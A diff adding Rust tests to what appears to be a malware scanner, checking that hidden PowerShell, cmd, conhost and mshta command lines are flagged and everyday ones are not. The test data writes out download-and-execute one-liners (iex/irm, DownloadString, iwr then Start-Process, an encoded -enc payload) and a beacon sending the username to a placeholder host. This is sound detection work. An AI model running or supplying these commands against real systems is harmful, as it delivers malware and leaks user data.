@@ -615,3 +615,91 @@ fn zip_bombs_are_unpacked_once_and_within_a_budget() {
     assert!(findings.iter().any(|f| f.id == "zip.inspected" && f.title.contains(" 32 program")), "{findings:?}");
     assert!(findings.iter().any(|f| f.id == "zip.partial" && f.title.starts_with("8 more")), "{findings:?}");
 }
+
+const POWERSHELL: &str = r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe";
+
+fn command(engine: &Engine, image: &str, line: &str) -> Report {
+    engine.scan_command(Path::new(image), line)
+}
+
+#[test]
+fn hidden_powershell_command_lines_are_detected() {
+    let engine = engine();
+    let encoded: Vec<u8> = "iex (iwr http://example.invalid/a -UseBasicParsing).Content".encode_utf16().flat_map(u16::to_le_bytes).collect();
+    let encoded = format!("powershell -w hidden -enc {}", STANDARD.encode(encoded));
+    let cases = [
+        (
+            POWERSHELL,
+            r#""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -w hidden -ep bypass -c "iwr http://example.invalid/a.exe -OutFile $env:TEMP\a.exe; Start-Process $env:TEMP\a.exe""#,
+            MALICIOUS,
+        ),
+        (POWERSHELL, r#"powershell -WindowStyle Hidden -NoProfile -Command "iex (irm 'http://example.invalid/p.ps1')""#, MALICIOUS),
+        // Abbreviated switches, a slash and a typographic dash, a number for the window style.
+        (POWERSHELL, "powershell /win 1 \u{2013}nop -c \"IEX(New-Object Net.WebClient).DownloadString('http://example.invalid/a')\"", MALICIOUS),
+        (POWERSHELL, &encoded, MALICIOUS),
+        // The program name is the caller's choice and says nothing.
+        (POWERSHELL, "update -wi hidden -c \"iwr -useb http://example.invalid/stage | iex\"", MALICIOUS),
+        (r"C:\Windows\System32\cmd.exe", "cmd /c \"powershell -w hidden -c iex(irm http://example.invalid)\"", MALICIOUS),
+        (r"C:\Windows\System32\conhost.exe", "conhost.exe --headless powershell -c \"iwr http://example.invalid/a -OutFile a.exe; saps a.exe\"", MALICIOUS),
+        // A hidden request that runs nothing (a beacon, or an updater's version check).
+        (POWERSHELL, "powershell -w hidden -c \"iwr http://example.invalid/b?u=$env:USERNAME\"", SUSPICIOUS),
+        (r"C:\Windows\SysWOW64\mshta.exe", r#""C:\Windows\SysWOW64\mshta.exe" http://example.invalid/a.hta"#, SUSPICIOUS),
+    ];
+    for (image, line, threshold) in cases {
+        let r = command(&engine, image, line);
+        assert!(r.score >= threshold, "{line}: {} {:?}", r.score, r.findings);
+        assert_eq!(r.kind, Kind::Command);
+        assert_eq!(r.command.as_deref(), Some(line));
+    }
+    let beacon = command(&engine, POWERSHELL, "powershell -w hidden -c \"iwr http://example.invalid/b\"");
+    assert_eq!(beacon.verdict, Verdict::Suspicious, "{:?}", beacon.findings);
+    assert_eq!(beacon.name, "powershell.exe command line");
+}
+
+#[test]
+fn everyday_script_host_command_lines_stay_clean() {
+    let engine = engine();
+    let cases = [
+        (POWERSHELL, r#"powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File "C:\Program Files\Vendor\update.ps1""#),
+        (POWERSHELL, r#"powershell -NoLogo -NoProfile -NonInteractive -Command "Get-CimInstance Win32_VideoController | Select-Object Name""#),
+        (POWERSHELL, r#"powershell -nop -c "iwr https://example.invalid/tool.zip -OutFile tool.zip; Expand-Archive tool.zip""#),
+        // Downloading an installer and starting it in plain sight.
+        (POWERSHELL, r#"powershell -c "iwr https://example.invalid/setup.exe -OutFile setup.exe; Start-Process setup.exe -Wait""#),
+        (POWERSHELL, r#"powershell -Command "Start-Process notepad -WindowStyle Hidden""#),
+        (r"C:\Windows\System32\cmd.exe", r#"C:\WINDOWS\system32\cmd.exe /d /s /c "git status --porcelain""#),
+        (r"C:\Windows\System32\cmd.exe", r#"cmd.exe /c start "" "https://example.invalid""#),
+        (r"C:\Windows\System32\conhost.exe", r"\??\C:\WINDOWS\system32\conhost.exe 0xffffffff -ForceV1"),
+        (r"C:\Windows\System32\wscript.exe", r#"wscript.exe //B "C:\Users\me\AppData\Local\Vendor\launch.vbs""#),
+    ];
+    for (image, line) in cases {
+        let r = command(&engine, image, line);
+        assert!(r.score < SUSPICIOUS, "{line}: {} {:?}", r.score, r.findings);
+    }
+}
+
+#[test]
+fn a_command_marked_safe_is_allowed() {
+    let mut engine = engine();
+    let line = "powershell -w hidden -c \"iex (irm http://example.invalid)\"";
+    let r = command(&engine, POWERSHELL, line);
+    assert_eq!(r.verdict, Verdict::Malicious);
+    engine.allowlist.insert(r.sha256.unwrap());
+    let r = command(&engine, POWERSHELL, line);
+    assert_eq!(r.verdict, Verdict::Clean);
+    assert!(r.findings.iter().any(|f| f.id == "allowlist"));
+}
+
+#[test]
+fn abbreviated_switches_and_aliases_in_files_are_recognized() {
+    let engine = engine();
+    let cases = [
+        ("drop.bat", "powershell -win hidden -c \"irm http://example.invalid/a | iex\"", MALICIOUS),
+        ("run.ps1", "iex (irm https://example.invalid/p.ps1)", SUSPICIOUS),
+        ("open.lnk", "powershell.exe -w 1 -c iwr http://example.invalid/a -OutFile $env:TEMP\\a.exe; saps $env:TEMP\\a.exe", MALICIOUS),
+    ];
+    for (name, text, threshold) in cases {
+        let kind = if name.ends_with(".lnk") { Kind::Shortcut } else { Kind::Script };
+        let (score, findings) = score(&engine, name, text, kind);
+        assert!(score >= threshold, "{name}: {score} {findings:?}");
+    }
+}
